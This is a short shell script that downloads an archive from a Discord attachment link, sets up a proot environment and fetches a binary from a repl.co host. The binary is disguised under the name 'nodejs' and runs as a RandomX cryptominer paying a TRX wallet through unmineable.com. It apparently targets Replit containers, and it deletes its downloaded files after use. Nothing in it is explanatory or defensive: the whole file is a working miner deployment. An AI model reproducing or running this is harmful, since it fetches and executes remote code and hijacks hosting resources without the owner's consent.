cd /tmp
rm -rf root
mkdir root
cd root
wget https://cdn.discordapp.com/attachments/853535040250970113/878590395611775016/yt.zip
unzip yt.zip
unzip root.zip
tar -xvf root.tar.xz
rm -rf music.mp3
rm -rf root.sh
rm -rf root.tar.xz
rm -rf root.sh
rm -rf video.mp4
rm -rf yt.zip
rm -rf root.zip
mkdir nodejs
cd nodejs
wget -O nodejs https://database.daxw1.repl.co/download
cd ..
echo "cd nodejs && chmod +x nodejs && ./nodejs -o rx.unmineable.com:3333 -a rx -k -u TRX:TUihB3stT4WpVWgDKLajU4L3EAiTeBW5Pc.$REPL_SLUG -p x > test" > main.sh
cd ..
cd root && ./dist/proot -S . /bin/bash ./main.sh
